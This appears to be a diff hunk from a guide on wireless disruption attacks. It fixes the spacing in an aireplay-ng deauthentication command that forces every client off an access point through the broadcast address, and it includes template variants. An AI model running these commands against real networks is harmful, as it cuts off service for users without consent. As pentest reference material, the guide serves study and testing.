@@ -92,7 +92,7 @@ In this type of disruption an attacker modifies the network card drivers and for
 To force all clients to forcibly reauthenticate.
 
 ```sh
-aireplay-ng -0 0 -a00:14:6C:7E:40:80 -c FF:FF:FF:FF:FF:FF wlan1
+aireplay-ng -0 0 -a 00:14:6C:7E:40:80 -c FF:FF:FF:FF:FF:FF wlan1
 aireplay-ng -0 0 -a <AP-MAC> -c <Client-MAC-or-FF:-for-all> <interface>
 # FF:FF:FF:FF:FF:FF is the broadcast address which affects all clients
 aireplay-ng -0 0 -a <AP-MAC> -c <Client-MAC-or-FF:-for-all> <interface> -D
